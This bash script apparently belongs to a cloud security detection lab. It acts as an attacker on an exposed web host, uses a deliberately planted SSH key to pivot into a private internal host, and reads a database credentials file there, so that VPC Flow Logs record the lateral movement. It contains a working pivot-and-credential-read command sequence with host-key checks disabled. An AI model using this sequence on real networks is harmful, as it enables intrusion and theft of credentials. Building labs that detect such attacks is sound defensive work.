#!/usr/bin/env bash
# Scenario 03 — ATTACK (lateral movement)
#
# Plays the attacker who has landed on the public web host (A) and pivots
# to the private internal host (B) that they should never be able to shell
# into. The pivot works only because of the security-group gap (B accepts
# SSH from A's SG) plus a leaked pivot key left on A by the "admins"
# (staged by scripts/configure.sh).
#
# Everything runs THROUGH A: the attacker never touches B directly from
# the operator machine (B has no public IP). The A->B SSH is the lateral
# movement that VPC Flow Logs will record.
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TF_DIR="$HERE/../terraform"

WEB_IP="$(terraform -chdir="$TF_DIR" output -raw web_public_ip)"
INTERNAL_IP="$(terraform -chdir="$TF_DIR" output -raw internal_private_ip)"
OPERATOR_KEY="${OPERATOR_KEY:-$HOME/.ssh/id_ed25519}"

SSH_OPTS="-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

echo "[*] Attack start (UTC): $(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[*] Foothold: web host ${WEB_IP} | pivot target: internal host ${INTERNAL_IP}"
echo

echo "=== STEP 1: on the foothold host, find the leaked pivot key ==="
ssh $SSH_OPTS -i "$OPERATOR_KEY" ec2-user@"$WEB_IP" \
  'ls -l ~/.ssh/pivot_key && echo "[+] found a private key left on the bastion"'

echo
echo "=== STEP 2: pivot A -> B over SSH using that leaked key ==="
echo "    (this is the lateral movement; it works because B's SG wrongly allows 22 from A)"
# Nested SSH: connect to A, then from A use the leaked key to SSH to B and
# read the prize. -A/agent not needed — the key already lives on A.
ssh $SSH_OPTS -i "$OPERATOR_KEY" ec2-user@"$WEB_IP" \
  "ssh $SSH_OPTS -i ~/.ssh/pivot_key ec2-user@${INTERNAL_IP} 'echo \"[+] shell on internal host: \$(hostname -f)\"; echo; echo \"[+] exfiltrating the prize:\"; cat /opt/app/db_credentials.txt'"

echo
echo "[*] Lateral movement complete. VPC Flow Logs take a few minutes to"
echo "    deliver to CloudWatch Logs — run scripts/detect.sh after that."
